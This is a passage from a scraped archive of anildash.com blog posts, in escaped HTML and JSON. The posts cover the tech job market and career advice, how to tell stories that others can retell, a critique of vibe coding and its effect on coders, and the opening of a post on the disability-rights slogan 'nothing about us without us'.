embarrassed or ashamed to discuss it. They think that everyone else who has a job in tech is happy or comfortable at their current employers, or that the other people looking for work are getting calls back or are being offered interviews in response to their job applications. But I\u2019m here to tell you: it is grim right now. About as bad as I\u2019ve seen. And I\u2019ve been around a long time.</p>\\n<p>Every major tech company has watched their leadership abandon principles that were once thought sacrosanct. I\u2019ve heard more people talk about losing respect for executives they trusted, respected, even admired in the last year than at any time I can remember. In smaller companies and other types of organizations, the challenges have been more about the hard choices that come from dire resource constraints or being forced to make ugly ethical compromises for pragmatic reasons. The net result is tons of people who have lost pride and conviction in their work. They\u2019re going through the motions for a paycheck, because they know it\u2019s a tough job market out there, which is a miserable state of affairs.</p>\\n<p>The public narrative is dominated by the loud minority of dudes who are content to appease the egos of their bosses, sucking up to the worse impulses of those in charge. An industry that used to pride itself on publicly reporting security issues and openly disclosing vulnerabilities now circles its wagons to gang up on people who suggest that an AI tool shouldn\u2019t tell children to harm themselves, that perhaps it should be possible to write a law limiting schools from deploying AI platforms that are known to tell kids to end their own lives. People in tech endure their bosses using slurs at work, making jokes about sexual assault, consorting with leaders who have directly planned the murder of journalists, engaging in open bribery in blatant violation of federal law and their own corporate training on corruption, and have to act like it\u2019s normal.</p>\\n<p>But it\u2019s not the end of the world. The forces of evil have not yet triumphed, and all hope is not lost. There are still things we can do.</p>\\nTaking back control\\n<p>It can be easy to feel overwhelmed at such an unprecedented time in the industry, especially when there\u2019s so much change happening. But there are concrete actions you can take to have agency over your own career, and to insulate yourself from the bad actors and maximize your own opportunities \u2014 even if some of those bad actors are your own bosses.</p>\\nUnderstanding systems\\n<p>One of the most important things you can do is to be clear about your own place, and your own role, within the systems that you are part of. A major factor in the changes that bosses are trying to effect with the deployment of AI is shifting the role of workers within the systems in their organization to make them more replaceable.</p>\\n<p>If you\u2019re a coder, and you think your job is to make really good code in a particular programming language, you might double down on getting better at the details of that language. But that\u2019s almost certainly misunderstanding the system that your company thinks you\u2019re part of, where the code is just a means to the end of creating a final product. In that system-centric view, the programming language, and indeed all of the code itself, doesn\u2019t really matter; the person who is productive at causing all of that code to be created reliably and efficiently is the person who is going to be valued, or at least who is most likely to be kept around. That may not be satisfying or reassuring if you truly love coding, but at least this perspective can help you make informed decisions about whether or not that organization is going to make choices that respect the things you value.</p>\\n<p>This same way of understanding systems can apply if you\u2019re a designer or a product manager or a HR administrator or anything else. As I\u2019ve covered before, the purpose of a system is what it does, and that truth can provide some hard lessons if we find it\u2019s in tension with the things we want to be doing for an organization. The system may not value the things we do, or it may not value them enough; the way they phrase this to avoid having to say it directly is by describing something as \u201cinefficient\u201d. Then, the question you have to ask yourself is, can you care about this kind of work or this kind of program at one level higher up in the system? Can it still be meaningful to you if it\u2019s slightly more abstract? Because that may be the requirement for navigating the expectations that technology organizations will be foisting on everyone through the language of talking about \u201cadopting AI\u201d.</p>\\nUnderstanding power\\n<p>Just as important as understanding systems is understanding power. In the workplace, power is something real. It means being able to control how money is spent. It means being able to make decisions. It means being able to hire people, or fire them. Power is being able to say no.</p>\\n<p>You probably don\u2019t have enough power; that\u2019s why you have worries. But you almost certainly have more power than you think, it\u2019s just not as obvious how to wield it. The most essential thing to understand is that you will need to collaborate with your peers to exercise collective power for many of the most significant things you may wish to achieve.</p>\\n<p>But even at an individual level, a key way of understanding power in your workplace is to consider the systems that you are part of, and then to reckon with which ones you can meaningfully change from your current position. Very often, people will, in a moment of frustration, say \u201cthis place couldn\u2019t run without me!\u201d And companies will almost always go out of their way to prove someone wrong if they hear that message.</p>\\n<p>On the other hand, if you identify a system for operating the organization that no one else has envisioned, you\u2019ve already demonstrated that this part of the organization couldn\u2019t run without you, and you don\u2019t need to say it or prove it. There is power in the mere action of creating that system. But a lot depends on where you have both the positional authority and the social permission to actually accomplish that kind of thing.</p>\\n<p>So, if you\u2019re dissatisfied with where you are, but have not decided to leave your current organization, then your first orders of business in this new year should be to consolidate power through building alliances with peers, and by understanding which fundamental systems of your organization you can define or influence, and thus be in control of. Once you\u2019ve got power, you\u2019ve got options.</p>\\nMost tech isn\u2019t \u201ctech\u201d\\n<p>So far, we\u2019re talking about very abstract stuff. What do we do if your job sucks right now, or if you don\u2019t have a job today and you really need one? After vague things like systems and power, then what?</p>\\n<p>Well, an important thing to understand, if you care about innovation and technology, is that the vast majority of technology doesn\u2019t happen in the startup world, or even in the \u201ctech industry\u201d. Startups are only a tiny fraction of the entire realm of companies that create or use technology, and the giant tech companies are only a small percentage of all jobs or hiring within the tech realm.</p>\\n<p>So much opportunity, inspiration, creativity, and possibility lies in applying the skills and experience that you may have from technological disciplines in other realms and industries that are often far less advanced in their deployment of technologies. In a lot of cases, these other businesses get taken advantage of for their lack of experience \u2014\\xa0and in the non-profit world, the lack of tech expertise or fluency is often exploited by both the technology vendors and bad actors who swoop in to capitalize on their vulnerability.</p>\\n<p>Many of the people I talk to who bring their technology experience to other fields also tell me that the culture in more traditional industries is often less toxic or broken than things in Silicon Valley (or Silicon Valley-based) companies are these days, since older or more established companies have had time to work out the more extreme aspects of their culture. It\u2019s an extraordinary moment in history when people who work on Wall Street tell me that even their HR departments wouldn\u2019t put up with the kind of bad behavior that we\u2019re seeing within the ranks of tech company execs.</p>\\nPlan for the long term\\n<p>This too shall pass. One of the great gifts of working in technology is that it\u2019s given so many of us the habit of constantly learning, of always being curious and paying attention to the new things worth discovering. That healthy and open-minded spirit is an important part of how to navigate a moment when lots of people are being laid off, or lots of energy and attention are being focused on products and initiatives that don\u2019t have a lot of substance behind them.\\nEventually, people will want to return to what\u2019s real. The companies that focus on delivering products with meaning, and taking care of employees over time, will be the ones that are able to persist past the current moment. So building habits that enable resiliency at both a personal and professional level is going to be key.</p>\\n<p>As I\u2019ve been fond of saying for a long time: don\u2019t let your job get in the way of your career.</p>\\n<p>Build habits and routines that serve your own professional goals. As much as you can, participate in the things that get your name out into your professional community, whether that\u2019s in-person events in your town, or writing on a regular basis about your area of expertise, or mentoring with those who are new to your field. You\u2019ll never regret building relationships with people, or being generous with your knowledge in ways that remind others that you\u2019re great at what you do.</p>\\n<p>If your time and budget permit, attend events in person or online where you can learn from others or respond to the ideas that others are sharing. The more people can see and remember that you\u2019re engaged with the conversations about your discipline, the greater the likelihood that they\u2019ll reach out when the next opportunity arises.</p>\\n<p>Similarly, take every chance you can to be generous to others when you see a door open that might be valuable for them. I can promise you, people will never forget that you thought of them in their time of need, even if they don\u2019t end up getting that role or nabbing that interview.</p>\\nIt\u2019s an evolution, not a resolution\\n<p>New years are often a time when people make a promise to themselves about how they\u2019re going to change everything. If I can just get this new notebook to write in, I\u2019m suddenly going to become a person who keeps a journal, and that will make me a person who\u2019s on top of everything all the time.</p>\\n<p>But hopefully you can see, many of the challenges that so many people are facing are systemic, and aren\u2019t the result of any personal failings or shortcomings. So there isn\u2019t some heroic individual change that you can make when you flip over to a new calendar month that will suddenly fix all the things.</p>\\n<p>What you can control, though, are small iterative things that make you feel better on a human scale, in little ways, when you can. You can help yourself maintain perspective, and you can do the same for those around you who share your values, and who care about the same personal or professional goals that you do.</p>\\n<p>A lot of us still care about things like the potential for technology to help people, or still believe in the idealistic and positive goals that got us into our careers in the first place. We weren\u2019t wrong, or naive, or foolish to aspire to those goals simply because some bad actors sought to undermine them. And it\u2019s okay to feel frustrated or scared in a time when it seems to many like those goals could be further away than they\u2019ve been in a long time.</p>\\n<p>I do hope, though, that people can see that, by sticking together, and focusing on the things that are within our reach, things can begin to change. All it takes is remembering that the power in tech truly rests with all the people who actually make things, not with the loudmouths at the top who try to tear things down.</p>'}</p> <p>\u6293\u53d6\u65f6\u95f4: 2026-02-05 08:41:11</p>"},{"location":"anildash.com/They%20have%20to%20be%20able%20to%20talk%20about%20us%20without%20us/","title":"They have to be able to talk about us without us","text":"<p>\u6765\u6e90: anildash.com \u53d1\u5e03\u65f6\u95f4: \u94fe\u63a5: https://anildash.com/2025/12/05/talk-about-us-without-us/</p> <p>{'type': 'text/html', 'language': None, 'base': 'https://anildash.com/', 'value': '<p>It\u2019s absolutely vital to be able to communicate effectively and efficiently to large groups of people. I\u2019ve been lucky enough to get to refine and test my skills in communicating at scale for a few decades now, and the power of talking to communities is the one area where I\u2019d most like to pass on what I\u2019ve learned, because it\u2019s this set of skills that can have the biggest effect on deciding whether good ideas and good work can have their greatest impact.</p>\\n<p>My own work crosses many disparate areas. Over the years, I\u2019ve gotten to cycle between domains as distinct as building technology platforms and products for developers and creators, enabling activism and policy advocacy in service of humanist ideals, and more visible external-facing work such as public speaking or writing in various venues like magazines or on this site. (And then sometimes I dabble in my other hobbies and fun stuff like scholarship or research into areas like pop culture and media.)</p>\\n<p>What\u2019s amazing is, in every single one of these wildly different areas, the exact same demands apply when trying to communicate to broad groups of people. This is true despite the broadly divergent cultural norms across all of these different disciplines. It can be a profoundly challenging, even intimidating, job to make sure a message is being communicated accurately, and in high fidelity, to everyone that you need to reach.</p>\\n<p>That vital task of communicating to a large group gets even more daunting when you inevitably realize that, even if you were to find the perfect wording or phrasing for your message, you\u2019d still never be able to deliver your story to every single person in your target audience by yourself anyway. There will always be another person whom you\u2019re trying to reach that you just haven\u2019t found yet. So, is it hopeless? Is it simply impossible to effectively tell a story at scale if you don\u2019t have massive resources?</p>\\n<p>It doesn\u2019t have to be. We can start with one key insight about what it takes to get your most important stories out into the world. It\u2019s a perspective that seems incredibly simple at first, but can lead to a pretty profound set of insights.</p>\\nThey have to be able to talk about us without us.\\n<p>They have to be able to talk about us without us. What this phrase means, in its simplest form,  is that you have to tell a story so clear, so concise, so memorable and evocative that people can repeat it for you even after you\u2019ve left the room. And the people who hear it need to be able to do this the first time they hear the story. Whether it\u2019s the idea behind a new product, the core promise of a political campaign, or the basic takeaway from a persuasive essay (guess what the point of this one is!) \u2014\\xa0not only do you have to explain your idea and make your case, you have to be teaching your listener how to do the same thing for themselves.</p>\\n<p>This is a tall order, to be sure. In pop music, the equivalent is writing a hit where people feel like they can sing along to the chorus by the time they get to the end of the song for the first time. Not everybody has it in them to write a hook that good, but if you do, that thing is going to become a classic. And when someone else has done it, you know it because it gets stuck in your head. Sometimes you end up humming it to yourself even if you didn\u2019t want to. Your best ideas \u2014\\xa0your most vital ideas \u2014\\xa0need to rest on a messaging platform that solid.</p>\\n<p>Delivering this kind of story actually requires substance. If you\u2019re trying to fake it, or to force a narrative out of fluff or fakery, that will very immediately become obvious. When you set out to craft a story that travels in your absence, it has to have a body if it\u2019s going to have legs. Bullshit is slippery and smells terrible, and the first thing people want to do when you leave the room is run away from it, not carry it with them.</p>\\nThe mission is the message\\n<p>There\u2019s another challenge to making a story that can travel in your absence: your ego has to let that happen. If you make a story that is effective and compelling enough that others can tell it, then, well\u2026. those other people are going to tell it.  Not you. They\u2019ll do it in their own words, and in their own voices, and make it theirs. They may use a similar story, but in their own phrasing, so it will resonate better with their people. This is a gift! They are doing you a kindness, and extending you great generosity. Respond with gratitude, and be wary of anyone who balks at not getting to be the voice or the face of a message themselves. Everyone gets a turn telling the story.</p>\\n<p>Maybe the simple fact that others will be hearing a good story for the first time will draw them to it, regardless of who the messenger is. Sometimes people get attached to the idea that they have to be the one to deliver the one true message. But a core precept of \u201ctalk about us without us\u201d is that there\u2019s a larger mission and goal that everyone is bought into, and this demands that everyone stay aligned to their values rather than to their own personal ambitions around who tells the story.</p>\\n<p>The truth of whomever will be most effective is the factor used to decide who will be the person to tell the story in any context. And this is a forgiving environment, because even if someone doesn\u2019t get to be the voice one day, they\u2019ll get another shot, since repetition and consistency are also key parts of this strategy, thanks to the disciplined approach that it brings to communication.</p>\\nThe joy of communications discipline\\n<p>At nearly every organization where I\u2019ve been in charge of onboarding team members in the last decade or so, one of the first messages we\u2019ve presented to our new colleagues is, \u201cWe are disciplined communicators!\u201d It\u2019s a message that they hopefully get to hear as a joyous declaration, and as an assertion of our shared values. I always try to explicitly instill this value into teams I work with because, first, it\u2019s good to communicate values explicitly, but also because this is a concept that is very seldom directly stated.</p>\\n<p>It is ironic that this statement usually goes unsaid, because nearly everyone who pays attention to culture understands the vital importance of disciplined communications. Brands that are strictly consistent in their use of things like logos, type, colors, and imagery get such wildly-outsized cultural impact in exchange for relatively modest investment that it\u2019s mind-boggling to me that more organizations don\u2019t insist on following suit. Similarly, institutions that develop and strictly enforce a standard tone of voice and way of communicating (even if the tone itself is playful or casual) capture an incredibly valuable opportunity at minimal additional cost relative to how much everyone\u2019s already spending on internal and external communications.</p>\\n<p>In an era where every channel is being flooded with AI-generated slop, and when most of the slop tools are woefully incapable of being consistent about anything, simply showing up with an obviously-human, obviously-consistent story is a phenomenal way of standing out. That discipline demonstrates all the best of humanity: a shared ethos, discerning taste, joyful expression, a sense of belonging, an appealing consistency. And best of all, it represents the chance to participate for yourself \u2014 because it\u2019s a message that you now know how to repeat for yourself.</p>\\n<p>Providing messages that individuals can pick up and run with on their own is a profoundly human-centric and empowering thing to do in a moment of rising authoritarianism. When the fascists in power are shutting down prominent voices for leveling critiques that they would like to censor, and demanding control over an increasingly broad number of channels, there\u2019s reassurance in people being empowered to tell their own stories together. Seeing stories bubble up from the grassroots in collaboration, rather than being forced down upon people from authoritarians at the top, has an emotional resonance that only strengthens the substance of whatever story you\u2019re telling.</p>\\nHow to do it\\n<p>Okay, so it sounds great: Let\u2019s tell stories that other people want to share! Now, uh\u2026 how do we do it? There are simple principles we can follow that help shape a message or story into one that is likely to be carried forward by a community on its own.</p>\\n<ul>\\n<li>Ground it in your values. When we began telling the story of my last company Glitch, the conventional wisdom was that we were building a developer tool, so people would describe it as an \u201cIDE\u201d \u2014 an \u201cintegrated development environment\u201d, which is the normal developer jargon for the tool coders use to write their code in. We never described Glitch that way. From day one, we always said \u201cGlitch is the friendly community where you\\'ll build the app of your dreams\u201d (later, \u201cthe friendly community where everybody builds the internet\u201d). By talking about the site as a friendly community instead of an <code>integrated development environment</code>, it was crystal clear what expectations and norms we were setting, and what our values were. Within a few months, even our competitors were describing Glitch as a \u201cfriendly community\u201d while they were trying to talk about how they were better than us about some feature or the other. That still feels like a huge victory \u2014 even the competition was talking about us without us! Make sure your message evokes the values you want people to share with each other, either directly or indirectly.</li>\\n<li>Start with the principle. This is a topic I\u2019ve covered before, but you can\\'t win unless you know what you\\'re fighting for. Identify concrete, specific, perhaps even measurable goals that are tied directly to the values that motivate your efforts. As noted recently, Zohran Mamdani did this masterfully when running for mayor of New York City. While the values were affordability and the dignity of ordinary New Yorkers, the clear, understandable, measurable principle could be something as simple as \u201cfree buses\u201d. This is a goal that everyone can get in 5 seconds, and can explain to their neighbor the first time they hear it. It\u2019s a story that travels effortlessly on its own \u2014 and that people will be able to verify very easily when it\u2019s been delivered. That\u2019s a perfect encapsulation of \u201ctalk about us without us\u201d.</li>\\n<li>Know what makes you unique.Another way of putting this is to simply make sure that you have a sense of self-awareness. But the story you tell about your work or your movement has to be specific. There can\u2019t be platitudes or generalities or vague assertions as a core part of the message, or it will never take off. One of the most common failure states for this mistake is when people lean on slogans. Slogans can have their use in a campaign, for reminding people about the existence of a brand, or supporting broader messaging. But very often, people think a slogan is a story. The problem is that, while slogans are definitely repeatable, slogans are almost definitionally too vague and broad to offer a specific and unique narrative that will resonate. There\u2019s no point in having people share something if it doesn\u2019t say something. I usually articulate the challenge here like this:Only say what only you can say.</li>\\n<li>Be evocative, not comprehensive. Many times, when people are passionate about a topic or a movement, the temptation they have in telling the story is to work in every little detail about the subject. They often think, \u201cif I include every detail, it will persuade more people, because they\u2019ll know that I\u2019m an expert, or it will convince them that I\u2019ve thought of everything!\u201d In reality, when people are not subject matter experts on a topic, or if they\u2019re not already intrinsically interested in that topic, hearing a bunch of extensive minutia about it will almost always leave them feeling bored, confused, intimidated, condescended-to, or some combination of all of these. Instead, pick a small subset of the most emotionally gripping parts of your story, the aspects that have the deepest human connection or greatest relevance and specificity to the broadest set of your audience, and focus on telling those parts of the story as passionately as possible. If you succeed in communicating that initial small subset of your story effectively, then you may earn the chance to tell the other more complex and nuanced details of your story.</li>\\n<li>Your enemies are your friends. Very often, when people are creating messages about advocacy, they\u2019re focused on competition or rivals. In the political realm, this can be literal opposing candidates, or the abstraction of another political party. In the corporate world, this can be (real or imagined) competitive products or companies. In many cases, these other organizations or products or competitors occupy so much more mental space in your mind, or your team\u2019s mind, than they do in the mind of your potential audience. Some of your audience has never heard of them at all. And a huge part of your audience thinks of you and your biggest rival as\u2026 basically the same thing. In a business or commercial context, customers can barely keep straight the difference between you and your competition \u2014 you\u2019re both just part of the same amorphous blob that exists as \u201cthe things that occupy that space\u201d. Your competitor may be the only other organization in the world that\u2019s fighting just as hard as you are to create a market for the product that you\u2019re selling. The same is true in the political space; sometimes the biggest friction arises over the narcissism of small differences. What we can take away from these perspectives is that our stories have to focus on what distinguishes us, yes, but also on what we might have in common with those whom we might otherwise have perceived to have been aligned with the \u201cenemy\u201d. Those folks might not have sworn allegiance to an opposing force; they may simply have chosen another option out of convenience, and not even seen that choice as being in opposition to your story at all.</li>\\n<li>Find joy in repetition. Done correctly, a disciplined, collaborative, evocative message can become a mantra for a community. There\u2019s a pride and enthusiasm that can come from people becoming proficient in sharing their own version of the collective story. And that means enjoying when that refrain comes back around, or when a slight improvement in the core message is discovered, and everyone finds a way to refine the way they\u2019re communicating about the narrative. A lot of times, people worry that their team will get bored if they\u2019re \u201cjust telling the same story over and over all the time\u201d. In reality, as a brilliant man once said, there\u2019s joy in repetition.</li>\\n<li>Don\u2019t obsess over exact wording. This one is tricky; you might say, \u201cbut you said we have to be disciplined communicators!\u201d And it\u2019s true: it\u2019s important to be disciplined. But that doesn\u2019t mean you can\u2019t leave room for people to put their own spin on things. Let them translate to their own languages or communities. Let them augment a general principle with a specific, personal connection. If they have their own authentic experience which will amplify a story or drive a point home, let them weave that context into the consistent narrative that\u2019s been shared over time. As long as you\u2019re not enabling a \u201ctelephone game\u201d where the story starts to morph into an unrecognizable form, it\u2019s perfectly okay to add a human touch by going slightly off script.</li>\\n</ul>\\nShare the story\\n<p>Few things are more rewarding than when you find a meaningful narrative that resonates with the world. Stories have the power to change things, to make people feel empowered, to galvanize entire communities into taking action and recognizing their own power. There\u2019s also a quiet reward in the craft and creativity of working on a story that travels, in finding notes that resonate with others, and in challenging yourself to get far enough out of your own head to get into someone else\u2019s heart.</p>\\n<p>I still have so much to learn about being able to tell stories effectively. I still screw it up so much of the time, and I can look back on many times when I wish I had better words at hand for moments that sorely needed them. But many of the most meaningful and rewarding moments of my life have been when I\u2019ve gotten to be in community with others, as we were not just sharing stories together, but telling a united story together. It unlocks a special kind of creativity that\u2019s a lot bigger than what any one of us can do alone.</p>'}</p> <p>\u6293\u53d6\u65f6\u95f4: 2026-02-05 08:41:11</p>"},{"location":"anildash.com/Vibe%20Coding-%20Empowering%20and%20Imprisoning/","title":"Vibe Coding: Empowering and Imprisoning","text":"<p>\u6765\u6e90: anildash.com \u53d1\u5e03\u65f6\u95f4: \u94fe\u63a5: https://anildash.com/2025/12/02/vibe-coding-empowering-and-imprisoning/</p> <p>{'type': 'text/html', 'language': None, 'base': 'https://anildash.com/', 'value': '<p>In case you haven\u2019t been following the world of software development closely, it\u2019s good to know that vibe coding \u2014 using LLM tools to assist with writing code \u2014\\xa0can help enable many people to create apps or software that they wouldn\u2019t otherwise be able to make. This has led to an extraordinarily rapid adoption curve amongst even experienced coders in many different disciplines within the world of coding. But there\u2019s a very important threat posed by vibe coding that almost no one has been talking about, one that\u2019s far more insidious and specific than just the risks and threats posted by AI or LLMs in general.</p>\\n<p>Here\u2019s a quick summary:</p>\\n<p>One of the most effective uses of LLMs is in helping programmers write code A huge reason VCs and tech tycoons put billions into funding LLMs was so they could undermine coders and depress wages</p>\\n<ul>\\n<li>Vibe coding might limit us to making simpler apps instead of the radical innovation we need to challenge Big Tech</li>\\n</ul>\\nStart vibing\\n<p>It may be useful to start by explaining how people use LLMs to assist with writing software. My background is that I\u2019ve helped build multiple companies focused on enabling millions of people to create with code. And I\u2019m personally an example of one common scenario with vibe coding. Since I don\u2019t code regularly anymore, I\u2019ve become much slower and less efficient at even the web development tasks that I used to do professionally, which I used to be fairly competent at performing. In software development, there are usually a nearly-continuous stream of new technologies being released (like when you upgrade your phone, or your computer downloads an update to your web browser), and when those things change, developers have to update their skills and knowledge to stay current with the latest tools and techniques. If you\u2019re not staying on top of things, your skillset can rapidly decay into irrelevance, and it can be hard to get back up to speed, even though you understand the fundamentals completely, and the underlying logic of how to write code hasn\u2019t changed at all. It\u2019s like knowing how to be an electrician but suddenly you have to do all your work in French, and you don\u2019t speak French.</p>\\n<p>This is the kind of problem that LLMs are really good at helping with. Before I had this kind of coding assistant, I couldn\u2019t do any meaningful projects within the limited amount of free time that I have available on nights and weekends to build things. Now, with the assistance of contemporary tools, I can get help with things like routine boilerplate code and obscure syntax, speeding up my work enough to focus on the fun, creative parts of coding that I love.</p>\\n<p>Even professional coders who are up to date on the latest technologies use these LLM tools to do things like creating scripts, which are essentially small bits of code used to automate or process common tasks. This kind of code is disposable, meaning it may only ever be run once, and it\u2019s not exposed to the internet, so security or privacy concerns aren\u2019t usually much of an issue. In that context, having the LLM create a utility for you can feel like being truly liberated from grunt work, something like having a robot vacuum around to sweep up the floor.</p>\\nSurfing towards serfdom\\n<p>This all sounds pretty good, right? It certainly helps explain why so many in the tech world tend to see AI much more positively than almost everyone else does; there\u2019s a clear-cut example of people finding value from these tools in a way that feels empowering or even freeing.</p>\\n<p>But there are far darker sides to this use of AI. Let me put aside the threats and risks of AI that are true of all uses of the Big AI platforms, like the environmental impact, the training on content without consent, the psychological manipulation of users, the undermining of legal regulations, and other significant harms. These are all real, and profound, but I want to focus on what\u2019s specific to using AI to help write code here, because there are negative externalities that are unique to this context that people haven\u2019t discussed enough. (For more on the larger AI discussion, see \"What would good AI look like?\")</p>\\n<p>The first problem raised by vibe coding is an obvious one: the major tech investors focused on making AI good at writing code because they wanted to make coders less powerful and reduce their pay. If you go back a decade ago, nearly everyone in the world was saying \u201cteach your kids to code\u201d and being a software engineer was one of the highest paying, most powerful individual jobs in the history of labor. Pretty soon, coders were acting like it \u2014\\xa0using their power to improve workplace conditions for those around them at the major tech companies, and pushing their employers to be more socially responsible. Once workers began organizing in this way, the tech tycoons who founded the big tech companies, and the board members and venture capitalists who backed them, immediately began investing billions of dollars in building these technologies that would devalue the labor of millions of coders around the world.</p>\\n<p>It worked. More than half a million tech workers have been laid off in America since ChatGPT was released in November 2022.</p>\\n<p>That\u2019s just in the private sector, and just the ones tracked by layoffs.fyi.  Software engineering job listings have plummeted to a 5-year low. This is during a period of time that nobody even describes as a recession. The same venture capitalists who funded the AI boom keep insisting that these trends are about macroeconomic abstractions like interest rates, a stark contrast to their rhetoric the rest of the time, when they insist that they are alpha males who make their own decisions based on their strong convictions and brave stances against woke culture. It is, in fact, the case that they are just greedy people who invested a ton of money into trying to put a lot of good people out of work, and they succeeded in doing so.</p>\\n<p>There is no reason why AI tools like this couldn\\'t be used in the way that they\\'re often described, where they increase productivity and enable workers to do more and generate more value. But instead we have the wealthiest people in the world telling the wealthiest companies in the world, while they generate record profits, to lay off workers who could be creating cool things for customers, and then blaming it on everyone but themselves.</p>\\nThe past as prison\\n<p>Then there\u2019s the second problem raised by vibe coding: You can\u2019t make anything truly radical with it. By definition, LLMs are trained on what has come before. In addition to being already-discovered territory, existing code is buggy and broken and sloppy and, as anyone who has ever written code knows, absolutely embarrassing to look at. Worse, many of the people who are using vibe coding tools are increasingly those who don\u2019t understand the code that is being generated by these systems. This means the people generating all of this newly-vibed code won\u2019t even know when the output is insecure, or will perform poorly, or includes exploits that let others take over their system, or when it is simply incoherent nonsense that looks like code but doesn\u2019t do anything.</p>\\n<p>All of those factors combine to encourage people to think of vibe coding tools as a sort of \u201cblack box\u201d that just spits out an app for you. Even the giant tech companies are starting to encourage this mindset, tacitly endorsing the idea that people don\u2019t need to know what their systems are doing under the hood. But obviously, somebody needs to know whether a system is actually secure. Somebody needs to know if a system is actually doing the tasks it says that it\u2019s doing. The Big AI companies that make the most popular LLMs on the market today routinely design their products to induce emotional dependency in users by giving them positive feedback and encouragement, even when that requires generating false responses. Put more simply: they make the bot lie to you to make you feel good so you use the AI more. That\u2019s terrible in a million ways, but one of them is that it sure does generate some bad code.</p>\\n<p>And a vibe coding tool absolutely won\u2019t make something truly new. The most radical, disruptive, interesting, surprising, weird, fun innovations in technology have happened because people with a strange compulsion to do something cool had enough knowledge to get their code out into the world. The World Wide Web itself was not a huge technological leap over what came before \u2014 it took off because of a huge leap in insight into human nature and human behavior, that happened to be captured in code. The actual bits and bytes? They were mostly just plain text, much of which was in formats that had already been around for many years prior to Tim Berners-Lee assembling it all into the first web browser. That kind of surprising innovation could probably never be vibe coded, even though all of the raw materials might be scooped up by an LLM, because even if the human writing the prompt had that counterintuitive stroke of genius, the system would still be hemmed in by the constraints of the works it had been trained on. The past is a prison when you\u2019re inventing the future.</p>\\n<p>What\u2019s more, if you were going to use a vibe coding tool to make a truly radical new technology, do you think today\u2019s Big AI companies would let their systems create that app? The same companies that made a platform that just put hundreds of thousands of coders out of work? The  same companies that make a platform that tells your kids to end their own lives? The same companies whose cronies in the White House are saying there should never be any laws reining them in? Those folks are going to help you make new tech that threatens to disrupt their power? I don\u2019t think so.</p>\\nPutting power in people\u2019s hands\\n<p>I\u2019m deeply torn about what the future of LLMs for coding should be. I\u2019ve spent decades of my life trying to make it easier for everyone to make software. I\u2019ve seen, firsthand, the power of using AI tools to help coders \u2014 especially those new to coding \u2014\\xa0build their confidence in being able to create something new. I love that potential, and in many ways, it\u2019s the most positive and optimistic possibility around LLMs that I\u2019ve seen. It\u2019s the thing that makes me think that maybe there is a part of all the AI hype that is not pure bullshit. Especially if we can find a version of these tools that\u2019s genuinely open source and free and has been trained on people\u2019s code with their consent and cooperation, perhaps in collaboration with some educational institutions, I\u2019d be delighted to see that shared with the world in a thoughtful way.</p>\\n<p>But I also have seen the majority of the working coders I know (and the non-working coders I know, including myself) rush to integrate the commercial coding assistants from the Big AI companies into their workflow without necessarily giving proper consideration to the long-term implications of that choice. What happens when we\u2019ve developed our dependencies on that assistance? How will people introduce new technologies like new programming languages and frameworks if we all consider the LLMs to be the canonical way of writing our code, and the training models don\u2019t know the new tech exists? How does our imagination shrink when we consider our options of what we create with code to be choosing between the outputs of the LLM rather than starting from the blank slate of our imagination? How will we build the next generation of coders skilled enough to catch the glaring errors that LLMs create in their code?</p>\\n<p>There\u2019s never been this stark a contrast between the negatives and positives of a new technology being so tightly coupled before when it comes to enabling developers. Generally change comes to coders incrementally. Historically, there was always a (wonderful!) default skepticism to coding culture, where anything that reeked of marketing or hype was looked at with a huge amount of doubt until there was a significant amount of proof to back it up.</p>\\n<p>But in recent years, as with everything else, the culture wars have come for tech. There\u2019s now a cohort in the coding world that has adopted a cult of personality around a handful of big tech tycoons despite the fact that these men are deeply corrosive to society. Or perhaps because they are. As a result, there\u2019s a built-in constituency for any new AI tool, regardless of its negative externalities, which gives them a sense of momentum even where there may not be any.</p>\\n<p>It\u2019s worth us examining what\u2019s really going on, and articulating explicitly what we\u2019re trying to enable. Who are we trying to empower? What does success look like? What do we want people to be able to build? What do we not want people to be able to make? What price is too high to pay? What convenience is not worth the cost?</p>\\nWhat tools do we choose?\\n<p>I do, still, believe deeply in the power of technology to empower people. I believe firmly that you have to understand how to create technology if you want to understand how to control it. And I still believe that we have to democratize the power to create and control technology to as many people as possible so that technology can be something people can use as a tool, rather than something that happens _to_them.</p>\\n<p>We are now in a complex phase, though, where the promise of democratizing access to creating technology is suddenly fraught in a way that it has never been before. The answer can\u2019t possibly be that technology remains inaccessible and difficult for those outside of a privileged class, and easy for those who are already comfortable in the existing power structure.</p>\\n<p>A lot is still very uncertain, but I come back to one key question that helps me frame the discussion of what\u2019s next: What\u2019s the most radical app that we could build? And which tools will enable me to build it? Even if all we can do is start having a more complicated conversation about what we\u2019re doing when we\u2019re vibe coding, we\u2019ll be making progress towards a more empowered future.</p>'}</p> <p>\u6293\u53d6\u65f6\u95f4: 2026-02-05 08:41:11</p>"},{"location":"anildash.com/What%20about%20%E2%80%9CNothing%20about%20us%20without%20us-%E2%80%9D/","title":"What about \u201cNothing about us without us?\u201d","text":"<p>\u6765\u6e90: anildash.com \u53d1\u5e03\u65f6\u95f4: \u94fe\u63a5: https://anildash.com/2025/12/08/what-about-nothing-about-us/</p> <p>{'type': 'text/html', 'language': None, 'base': 'https://anildash.com/', 'value': '<p>As I was drafting my last piece on Friday, \u201cThey have to be able to talk about us without us\u201d, my thoughts of course went to one of the most famous slogans of the disability rights movement, \u201cNothing about us without us.\u201d I wasn\u2019t unaware that there were similarities in the phrasing of what I wrote. But I think the topic of communicating effectively to groups, as I wrote about the other day, and ensuring that disabled people are centered in disability advocacy, are such different subjects that I didn\u2019t want to just quickly gloss over the topic in a sidebar of a larger piece. They\\'re very distinct topics that really only share a few words in common.</p>\\n<p>One of the great joys of becoming friends with a number of really thoughtful and experienced disability rights activists over the last several years has been their incredible generosity in teaching me about so much of the culture and history of the movements that they\u2019ve built their work upon, and one of the most powerful slogans has been that refrain of \u201cnothing about us without us\u201d.</p>\\n<p>Here I should start by acknowledging Alice Wong, who we recently lost, who founded the Disability Visibility Project, and a MacArthur Fellow, and a tireless and inventive advocate for everyone in the disabled community. She was one of the first people to bring me in to learning about this history and these movements, more than a decade ago. She was also a patient and thoughtful teacher, and over our many conversations over the years, she did more than anyone else in my life to truly personify the spirit of \u201cnothing about us without us\u201d by fighting to ensure that disabled people led the work to make the world accessible for all. If you have the chance, learn about her work, and support it.</p>\\n<p>But a key inflection point in my own understanding of \u201cnothing about us without us\u201d came, unsurprisingly, in the context of how disabled people have been interacting with technology. I used to host a podcast called Function, and we did an episode about how inaccessible so much of contemporary technology has become, and how that 